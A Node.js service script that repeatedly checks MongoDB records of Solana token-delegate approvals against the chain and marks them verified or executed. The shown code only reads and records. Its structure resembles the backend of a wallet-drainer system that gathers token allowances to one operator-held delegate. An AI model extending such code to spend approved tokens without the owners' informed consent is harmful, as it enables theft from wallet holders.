require('dotenv').config();

const { MongoClient } = require('mongodb');
const { Connection, PublicKey } = require('@solana/web3.js');
const { getAccount } = require('@solana/spl-token');

// Configuration
const MONGO_URI = process.env.MONGODB_URI;

// Solana network configuration
const solanaConfig = {
  'mainnet-beta': {
    rpcUrl: process.env.SOLANA_MAINNET_RPC || 'https://api.mainnet-beta.solana.com',
    delegateAddress: process.env.SOLANA_MAINNET_DELEGATE,
  },
};

const client = new MongoClient(MONGO_URI);

async function verifySolanaApprovals() {
  try {
    await client.connect();
    const db = client.db('permit2DB');
    const solanaApprovalsCollection = db.collection('solana_approvals');

    // Find unverified approvals
    const approvals = await solanaApprovalsCollection.find({ 
      verified: { $ne: true },
      executed: false 
    }).toArray();

    if (approvals.length === 0) {
      console.log('No unverified Solana approvals found');
      return;
    }

    console.log(`Found ${approvals.length} unverified Solana approvals`);

    for (const approvalData of approvals) {
      const { owner, delegate, approvals: approvalList, transactionSignature, network } = approvalData;

      if (!network || !solanaConfig[network]) {
        console.log(`Unsupported network ${network} for owner: ${owner}`);
        continue;
      }

      const { rpcUrl, delegateAddress } = solanaConfig[network];
      
      // Use the delegate from config if available, otherwise use the one from DB
      const delegateToCheck = delegateAddress || delegate;
      
      if (!delegateToCheck) {
        console.log(`No delegate address configured for network ${network}`);
        continue;
      }

      const connection = new Connection(rpcUrl, 'confirmed');
      const delegatePublicKey = new PublicKey(delegateToCheck);

      console.log(`Verifying approval for owner: ${owner} on network: ${network}`);
      console.log(`Transaction signature: ${transactionSignature}`);

      // Verify transaction exists and is confirmed
      try {
        const transaction = await connection.getTransaction(transactionSignature, {
          commitment: 'confirmed',
        });

        if (!transaction) {
          console.log(`Transaction ${transactionSignature} not found`);
          await solanaApprovalsCollection.updateOne(
            { _id: approvalData._id },
            { 
              $set: { 
                executed: true, 
                executedAt: new Date(), 
                reason: 'Transaction not found on-chain' 
              } 
            }
          );
          continue;
        }

        if (!transaction.meta || transaction.meta.err) {
          console.log(`Transaction ${transactionSignature} failed:`, transaction.meta?.err);
          await solanaApprovalsCollection.updateOne(
            { _id: approvalData._id },
            { 
              $set: { 
                executed: true, 
                executedAt: new Date(), 
                reason: `Transaction failed: ${JSON.stringify(transaction.meta?.err)}` 
              } 
            }
          );
          continue;
        }

        // Verify each approval on-chain
        let allVerified = true;
        const verificationResults = [];

        for (const approval of approvalList) {
          try {
            const tokenAccountPubkey = new PublicKey(approval.tokenAccount);
            const accountInfo = await getAccount(connection, tokenAccountPubkey);

            // Check if the delegate has the expected allowance
            // Note: In Solana, the delegate is stored in the account's delegate field
            // and the amount is stored separately
            const isDelegateSet = accountInfo.delegate && 
              accountInfo.delegate.toString() === delegatePublicKey.toString();
            
            const hasAllowance = accountInfo.delegatedAmount > 0n;

            if (isDelegateSet && hasAllowance) {
              verificationResults.push({
                tokenAccount: approval.tokenAccount,
                verified: true,
                delegatedAmount: accountInfo.delegatedAmount.toString(),
              });
              console.log(`✅ Verified approval for token account: ${approval.tokenAccount}`);
            } else {
              verificationResults.push({
                tokenAccount: approval.tokenAccount,
                verified: false,
                reason: isDelegateSet ? 'No allowance set' : 'Delegate not set',
              });
              console.log(`❌ Approval verification failed for token account: ${approval.tokenAccount}`);
              allVerified = false;
            }
          } catch (verifyError) {
            console.error(`Error verifying approval for ${approval.tokenAccount}:`, verifyError);
            verificationResults.push({
              tokenAccount: approval.tokenAccount,
              verified: false,
              reason: verifyError.message,
            });
            allVerified = false;
          }
        }

        // Update database with verification results
        if (allVerified) {
          await solanaApprovalsCollection.updateOne(
            { _id: approvalData._id },
            { 
              $set: { 
                verified: true, 
                verifiedAt: new Date(),
                verificationResults,
              } 
            }
          );
          console.log(`✅ All approvals verified for owner: ${owner}`);
        } else {
          await solanaApprovalsCollection.updateOne(
            { _id: approvalData._id },
            { 
              $set: { 
                verified: false, 
                verifiedAt: new Date(),
                verificationResults,
                reason: 'Some approvals failed verification',
              } 
            }
          );
          console.log(`⚠️ Some approvals failed verification for owner: ${owner}`);
        }
      } catch (txError) {
        console.error(`Error fetching transaction ${transactionSignature}:`, txError);
        await solanaApprovalsCollection.updateOne(
          { _id: approvalData._id },
          { 
            $set: { 
              executed: true, 
              executedAt: new Date(), 
              reason: `Transaction fetch error: ${txError.message}` 
            } 
          }
        );
        continue;
      }
    }
  } catch (error) {
    console.error('Verification failed:', error);
  } finally {
    await client.close();
  }
}

async function runContinuously() {
  console.log('Starting continuous Solana approval verification service...');
  
  while (true) {
    try {
      await verifySolanaApprovals();
    } catch (error) {
      console.error('Error in verification cycle:', error);
    }
    
    console.log('Waiting 30 seconds before next check...');
    await new Promise(resolve => setTimeout(resolve, 30000));
  }
}

// Run if called directly
if (require.main === module) {
  runContinuously().catch((error) => {
    console.error('Service failed:', error);
    process.exit(1);
  });
}

module.exports = { verifySolanaApprovals };

